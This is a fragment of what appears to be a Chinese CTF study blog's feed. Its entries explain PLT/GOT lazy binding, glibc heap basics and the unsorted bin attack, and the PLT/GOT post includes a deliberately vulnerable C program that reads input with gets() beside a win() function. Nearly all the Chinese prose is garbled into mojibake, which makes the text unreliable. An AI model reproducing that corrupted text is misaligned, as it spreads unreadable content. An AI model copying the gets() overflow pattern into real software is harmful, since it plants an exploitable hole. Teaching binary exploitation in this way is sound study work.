src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png" alt="image-20201222164945226"></p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png" alt="img"></p><p>ç»è¿‡ä¸Šé¢åŸç†çš„è§£é‡Šï¼Œè¿™ä¸ªå°±ä¸è¯´äº†</p><p>æœ€åæ€»ç»“ä¸€å¥è¯:</p><p>ä¿®æ”¹ target å¤„çš„å€¼ä¸º unsorted bin çš„é“¾è¡¨å¤´éƒ¨ 0x7f1c705ffb78ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰è¾“å‡ºçš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ° unsorted bin attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å †åŸºç¡€å’Œå †æ¼æ´è¿˜æ˜¯åˆ†å¼€æ¯”è¾ƒå¥½&lt;/p&gt;
&lt;p&gt;è¿™æ ·çœ‹ç€ä¹Ÿæ¯”è¾ƒæ•´é½&lt;/p&gt;
&lt;h1 id=&quot;å †æ¼æ´&quot;&gt;&lt;a href=&quot;#å †æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;å †æ¼æ´&quot;&gt;&lt;/a&gt;å †æ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;0x01-Off-By-One&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="å †" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>pltè¡¨å’Œgotè¡¨</title>
    <link href="https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"/>
    <id>https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/</id>
    <published>2020-12-16T13:32:03.000Z</published>
    <updated>2020-12-17T01:05:53.222Z</updated>
    
    <content type="html"><![CDATA[<p>éœ€è¦å•¥ å­¦å•¥</p><p>çœ‹å­¦é•¿åšå®¢å†™äº†è¿™ä¸ª è‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ æ¯•ç«Ÿåˆšå­¦</p><p><a href="https://ld1ng.com/2020/06/16/GOTPLT/" target="_blank" rel="noopener">https://ld1ng.com/2020/06/16/GOTPLT/</a></p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><p><a href="https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><h1 id="GOTè¡¨å’ŒPLTè¡¨"><a href="#GOTè¡¨å’ŒPLTè¡¨" class="headerlink" title="GOTè¡¨å’ŒPLTè¡¨"></a>GOTè¡¨å’ŒPLTè¡¨</h1><p>GOTï¼ˆå…¨å±€åç§»è¡¨ï¼‰å’Œ PLT(è¿‡ç¨‹é“¾æ¥è¡¨)ï¼Œæ˜¯ä¸¤ä¸ªè¡¨ä¹‹é—´çš„äº¤äº’æ‰ä½¿å¾—å‡½æ•°å®ç°å»¶è¿Ÿç»‘å®šï¼Œé€šè¿‡è¿™ç§æ–¹æ³•å°†è¿‡ç¨‹åœ°å€çš„ç»‘å®šæ¨è¿Ÿåˆ°ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚</p><h1 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you win\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">gets(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you lose\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿™ä¸ªæ–‡ä»¶</p><p>gdbè°ƒè¯•ä¸€ä¸‹</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png" alt="image-20201216221001253"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>gets@plt</code>å’Œ<code>puts@plt</code>è¿™ä¸¤ä¸ªå‡½æ•°</p><p>@pltè¿™é‡Œçš„æ„æ€æ˜¯æŒ‡PLTè¡¨ä¸­çš„æ•°æ®çš„åœ°å€ã€‚</p><blockquote><p>ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒå’Œå†…å­˜CPUçš„åˆ©ç”¨ç‡ï¼Œç¨‹åºç¼–è¯‘æ—¶ä¼šé‡‡ç”¨ä¸¤ç§è¡¨è¿›è¡Œè¾…åŠ©ï¼Œä¸€ä¸ªä¸ºPLTè¡¨ï¼Œä¸€ä¸ªä¸ºGOTè¡¨ï¼ŒPLTè¡¨å¯ä»¥ç§°ä¸ºå†…éƒ¨å‡½æ•°è¡¨ï¼ŒGOTè¡¨ä¸ºå…¨å±€å‡½æ•°è¡¨ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯åŠ¨æ€å‡½æ•°è¡¨è¿™æ˜¯ä¸ªäººè‡ªç§°ï¼‰ï¼Œè¿™ä¸¤ä¸ªè¡¨æ˜¯ç›¸å¯¹åº”çš„ï¼Œä»€ä¹ˆå«åšç›¸å¯¹åº”å‘¢ï¼ŒPLTè¡¨ä¸­çš„æ•°æ®å°±æ˜¯GOTè¡¨ä¸­çš„ä¸€ä¸ªåœ°å€ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å®šæ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œ</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p></blockquote><p>è¿™æ—¶ æˆ‘ä»¬ä¹Ÿå°±ç†è§£äº†@pltæ ‡å¿—çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯ä¸ªè¿‡æ¸¡ä½œç”¨ï¼Œå› ä¸ºGOTè¡¨é¡¹ä¸­çš„æ•°æ®æ‰æ˜¯å‡½æ•°æœ€ç»ˆçš„åœ°å€ï¼Œè€ŒPLTè¡¨ä¸­çš„æ•°æ®åˆæ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨æ¥å¾—åˆ°å‡½æ•°çœŸæ­£çš„åœ°å€ã€‚</p><p>é‚£@pltå‡½æ•°é‡Œé¢æ˜¯ä»€ä¹ˆå‘¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass gets</span><br></pre></td></tr></table></figure><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png" alt="image-20201216223010888"></p><blockquote><ol><li>jmpæŒ‡ä»¤è·³è½¬åˆ°GOTè¡¨</li><li>GOTè¡¨ä¸­çš„æ•°æ®ä¸º0x4004c6</li><li>è·³è½¬åˆ°æŒ‡ä»¤åœ°å€ä¸º0x4004c6</li><li>æ‰§è¡Œ<code>push 0x3</code>è¿™ä¸ªä¸ºåœ¨GOTä¸­çš„ä¸‹æ ‡åºå·</li><li>åœ¨æ‰§è¡Œ<code>jmp 0x400480</code></li><li>è€Œ0x400480ä¸ºPLT[0]çš„åœ°å€</li><li>PLT[0]çš„æŒ‡ä»¤ä¼šè¿›å…¥åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£</li><li>æ‰§è¡Œä¸€ä¸ªå‡½æ•°å°†çœŸæ­£çš„å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­</li></ol></blockquote><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>1.<strong>PLT[0]å¤„åˆ°åº•åšäº†ä»€ä¹ˆï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¹‹å‰çš„æ€è·¯å®ƒä¸æ˜¯åº”è¯¥è·³è½¬åˆ°GOT[0]å—</strong></p><p>è¿™æ˜¯plt[0]ä¸­çš„å†…å®¹</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png" alt="image-20201217082532501"></p><p>åé¢çš„16è¿›åˆ¶å°±æ˜¯GOTè¡¨ä¸­çš„å†…å®¹</p><blockquote><p><strong>æˆ‘ä»¬çš„PLT[0]æ ¹æœ¬æ²¡æœ‰è·³è½¬åˆ°GOT[0]ï¼Œå®ƒä¸åƒæˆ‘ä»¬çš„PLT[1]è¿™äº›å­˜å‚¨çš„æ˜¯GOTè¡¨é¡¹çš„åœ°å€ï¼Œå®ƒæ˜¯ä¸€äº›ä»£ç æŒ‡ä»¤ï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢è¿™å¼ å›¾</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><p>è€Œplt[0]ä»£ç åšçš„äº‹æƒ…åˆ™æ˜¯ï¼šç”±äºGOT[2]ä¸­å­˜å‚¨çš„æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„å…¥å£åœ°å€ï¼Œæ‰€ä»¥é€šè¿‡<strong>GOT[1]ä¸­çš„æ•°æ®ä½œä¸ºå‚æ•°ï¼Œè·³è½¬åˆ°GOT[2]æ‰€å¯¹åº”çš„å‡½æ•°å…¥å£åœ°å€ï¼Œè¿™ä¸ªåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ä¸€ä¸ªå‡½æ•°çš„çœŸæ­£åœ°å€ç»‘å®šåˆ°ç›¸åº”çš„GOT[x]ä¸­ã€‚</strong></p><p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡PLTè¡¨è°ƒç”¨ï¼Œä¸€ä¸ªåˆ™æ˜¯é€šè¿‡GOTè¡¨è°ƒç”¨ï¼Œ<strong>å› ä¸ºPLTè¡¨æœ€ç»ˆä¹Ÿæ˜¯è·³è½¬GOTè¡¨ï¼ŒGOTè¡¨ä¸­åˆ™æ˜¯ä¸€ä¸ªå‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿è¡Œä¸€æ¬¡ä¹‹å‰ï¼ŒGOTè¡¨ä¸­çš„æ•°æ®ä¸º@pltå‡½æ•°ä¸­ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</strong></p><p>2.<strong>ä¸ºä»€ä¹ˆä¸­é—´è¦è¿›è¡Œpushå‹æ ˆæ“ä½œï¼Ÿ</strong></p><p>ä¸­é—´è¿›è¡Œçš„å‹æ ˆæ˜¯ä¸ºäº†ç¡®å®šPLTå¯¹åº”çš„GOTè¡¨é¡¹ï¼Œå³æ˜¯PLT[1]âˆ’&gt;GOT[3]ï¼Œ0x3å°±æ˜¯GOTçš„ä¸‹æ ‡3ï¼Œä¹Ÿå°±æ˜¯è¯´å‹æ ˆåæˆ‘ä»¬è·³è½¬åˆ°PLT[0],æ¥ç€PLT[0]ä¸­çš„æŒ‡ä»¤ä¼šé€šè¿‡è¿™æ¬¡å‹æ ˆçš„åºå·æ¥ç¡®å®šæ“ä½œçš„GOTè¡¨é¡¹ä¸ºå¤šå°‘</p><p>3.<strong>å‹å…¥çš„åºå·ä¸ºä»€ä¹ˆä¸º0x3ï¼Œä¸æ˜¯æœ€å¼€å§‹åº”è¯¥ä¸º0x0å—ï¼Ÿ</strong></p><p>å› ä¸ºGOT[0],GOT[1],GOT[2]éƒ½æœ‰å…¶ä»–ç”¨å¤„ï¼Œæ‰€ä»¥ä»0x3å¼€å§‹ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h2 id="GOTè¡¨çš„æ„æˆ"><a href="#GOTè¡¨çš„æ„æˆ" class="headerlink" title="GOTè¡¨çš„æ„æˆ"></a>GOTè¡¨çš„æ„æˆ</h2><p>GOT[0]åŒ…å«.dynamicæ®µçš„åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯;</p><p>GOT[1]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†;</p><p>GOT[2]åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç çš„å…¥å£ç‚¹ã€‚</p><p>GOTçš„å…¶ä»–è¡¨ç›®ä¸ºæœ¬æ¨¡å—è¦å¼•ç”¨çš„ä¸€ä¸ªå…¨å±€å˜é‡æˆ–å‡½æ•°çš„åœ°å€ã€‚</p><h2 id="PLTè¡¨çš„æ„æˆ"><a href="#PLTè¡¨çš„æ„æˆ" class="headerlink" title="PLTè¡¨çš„æ„æˆ"></a>PLTè¡¨çš„æ„æˆ</h2><p>PLTè¡¨å¹¶ä¸æ˜¯æ¯ä¸ªè¡¨é¡¹éƒ½ç”¨äºå­˜æ”¾â€œå‡½æ•°åœ°å€â€œï¼Œå…¶ä¸­PLT[0]æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è¡¨ç›®ï¼Œå®ƒè·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ä¸­æ‰§è¡Œï¼Œæ¢å¥è¯è¯´ï¼ŒPLT[0]æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯é€šè¿‡GOT[1]å’ŒGOT[2]æ¥æ­£ç¡®ç»‘å®šä¸€ä¸ªå‡½æ•°çš„æ­£å¼åœ°å€åˆ°GOTè¡¨ä¸­æ¥ã€‚</p><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><p>æœ€åï¼Œè‡ªå·±æ€»ç»“ä¸€ä¸‹å®ç°è¿‡ç¨‹</p><ol><li>é¦–å…ˆï¼Œè¿›å…¥PLTè¡¨é¡¹ï¼Œè¿™æ—¶ç¬¬ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°GOTè¡¨é¡¹</li><li>GOTè¡¨é¡¹å­˜æ”¾PLTè¡¨ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯<code>push 0x x</code>æŠŠç›¸åº”çš„idxå‹å…¥</li><li>ä¸‹ä¸€æ­¥å°±æ˜¯è·³è½¬åˆ°PLT[0]ä¸­ï¼Œè¿›è€Œé“¾æ¥åˆ°GOT[2] ,è¿›å…¥é“¾æ¥å™¨å…¥å£</li><li>æœ€åé€šè¿‡åŠ¨æ€é“¾æ¥å™¨å°†çœŸæ­£å‡½æ•°åœ°å€è¦†ç›–åˆ°GOTè¡¨ä¸­</li></ol><p>åˆ«äººçš„åŠ¨å›¾</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;éœ€è¦å•¥ å­¦å•¥&lt;/p&gt;
&lt;p&gt;çœ‹å­¦é•¿åšå®¢å†™äº†è¿™ä¸ª è‡ªå·±ä¹Ÿè®°å½•ä¸€ä¸‹ æ¯•ç«Ÿåˆšå­¦&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/06/16/GOTPLT/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ld1ng.c</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>å †</title>
    <link href="https://pz1o.top/2020/12/15/%E5%A0%86/"/>
    <id>https://pz1o.top/2020/12/15/%E5%A0%86/</id>
    <published>2020-12-15T08:19:22.000Z</published>
    <updated>2020-12-22T13:19:27.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å †-æŒç»­æ›´æ–°"><a href="#å †-æŒç»­æ›´æ–°" class="headerlink" title="å †(æŒç»­æ›´æ–°)"></a>å †(æŒç»­æ›´æ–°)</h1><p><a href="https://ld1ng.com/2020/07/23/Heap/" target="_blank" rel="noopener">https://ld1ng.com/2020/07/23/Heap/</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p><p>ä¸Šä¸€ä¸ªPWNå­¦ä¹  å­¦å¾—ä¸å¤ªå…¨é¢</p><p>å†™è¿™ä¸ªä¸»è¦æ˜¯ä¸ºäº†è‡ªå·±èƒ½å¤Ÿå…¨é¢å¤ä¹ å †çš„åŸºç¡€çŸ¥è¯†</p><p>ç”±äºæˆ‘æ²¡å­¦è¿‡æ“ä½œç³»ç»Ÿ æœ‰äº›ç›¸å…³çŸ¥è¯†å¯èƒ½ä¸å¤ªå¯¹ è¿˜è¯·æŒ‡æ­£</p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="0x01-ä»€ä¹ˆæ˜¯å †"><a href="#0x01-ä»€ä¹ˆæ˜¯å †" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯å †"></a>0x01 ä»€ä¹ˆæ˜¯å †</h3><ul><li>åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜</li><li>å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿</li><li>æˆ‘ä»¬ä¸€èˆ¬æˆç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨</li></ul><p>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ</p><ul><li>malloc</li><li>free</li></ul><h3 id="0x02-å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †"><a href="#0x02-å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †" class="headerlink" title="0x02 å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †"></a>0x02 å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †</h3><h4 id="1-mallocå‡½æ•°"><a href="#1-mallocå‡½æ•°" class="headerlink" title="1.mallocå‡½æ•°"></a>1.<strong>mallocå‡½æ•°</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>è¯¥å‡½æ•°è¿”å›å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ</li><li>æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜å¯¹ä¸€äº›å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç†</li><li>å½“n=0æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—</li><li><strong>å½“nä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œsize_tæ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…</strong></li></ul><h4 id="2-freeå‡½æ•°"><a href="#2-freeå‡½æ•°" class="headerlink" title="2.freeå‡½æ•°"></a>2.<strong>freeå‡½æ•°</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>è¯¥å‡½æ•°ä¼šé‡Šæ”¾ç”±pæ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚è¿™ä¸ªå†…å­˜å—æœ‰å¯èƒ½æ˜¯é€šè¿‡mallocå‡½æ•°å¾—åˆ°çš„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡ç›¸å…³çš„å‡½æ•°reallocå¾—åˆ°çš„</li></ul><p>è¯¥å‡½æ•°è¿˜å¯¹å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†ä¸€ä¸‹å¤„ç†</p><ul><li>å½“pä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</li><li>å½“på·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°é”™è¯¯çš„æ•ˆæœï¼Œè¿™å…¶å®å°±æ˜¯double free</li><li>é™¤äº†è¢«ç¦ç”¨ï¼ˆmallocptï¼‰çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿å‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´</li></ul><h3 id="0x03-å¦‚ä½•å®ç°å †"><a href="#0x03-å¦‚ä½•å®ç°å †" class="headerlink" title="0x03 å¦‚ä½•å®ç°å †"></a>0x03 å¦‚ä½•å®ç°å †</h3><ul><li>å †çš„glibcå®ç°ä¸»è¦åŒ…æ‹¬struct _heap_infoï¼Œstruct malloc_stateï¼Œstruct malloc_chunkè¿™3ä¸ªç»“æ„ä½“</li></ul><h4 id="1-Arena"><a href="#1-Arena" class="headerlink" title="1.Arena"></a>1.Arena</h4><p><img src="/2020/12/15/%E5%A0%86/image-20201212002041969.png" alt="image-20201212002041969"></p><blockquote><ul><li>ä¸€ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ªarneaï¼Œå¹¶ä¸”è¿™äº›çº¿ç¨‹çš„arneaéƒ½æ˜¯ç‹¬ç«‹çš„ä¸æ˜¯ç›¸åŒçš„</li><li>ä¸»çº¿ç¨‹çš„arneaç§°ä¸ºâ€œmain_arenaâ€ã€‚å­çº¿ç¨‹çš„arneaç§°ä¸ºâ€œthread_arenaâ€</li></ul></blockquote><h5 id="Arenaçš„æ•°é‡åŠç®¡ç†"><a href="#Arenaçš„æ•°é‡åŠç®¡ç†" class="headerlink" title="Arenaçš„æ•°é‡åŠç®¡ç†"></a>Arenaçš„æ•°é‡åŠç®¡ç†</h5><p>æˆ‘ä»¬è¯´åˆ°æœ‰ä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„arena</p><p><strong>é‚£ä¹ˆæ¯ä¸ªç¨‹åºçš„arenaçš„æ•°é‡åº”è¯¥å°±æ˜¯æœ‰é™çš„</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32</span>ä½ç³»ç»Ÿä¸­ï¼š</span><br><span class="line">     Number of arena = <span class="number">2</span> * number of cores + <span class="number">1.</span></span><br><span class="line"><span class="number">64</span>ä½ç³»ç»Ÿä¸­ï¼š</span><br><span class="line">     Number of arena = <span class="number">8</span> * number of cores + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¼šæ¶‰åŠä¸€ä¸ªå¤šçº¿ç¨‹å…±äº«é—®é¢˜</p><blockquote><p>egï¼šä¸€ä¸ªä¸»Arena ä¸¤ä¸ªå‰¯Arena</p><p>å¦‚æœæœ‰ä¸€ä¸ª4çº¿ç¨‹ï¼ˆå¤§äº3ä¸ªArenaï¼‰çš„ç¨‹åºï¼Œæ˜¾ç„¶è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªå…±äº«é—®é¢˜</p><p><strong>æ­¤æ—¶glibc mallocä¼šåšä»¥ä¸‹æ“ä½œï¼š</strong></p><ul><li>é¦–å…ˆï¼Œglibc 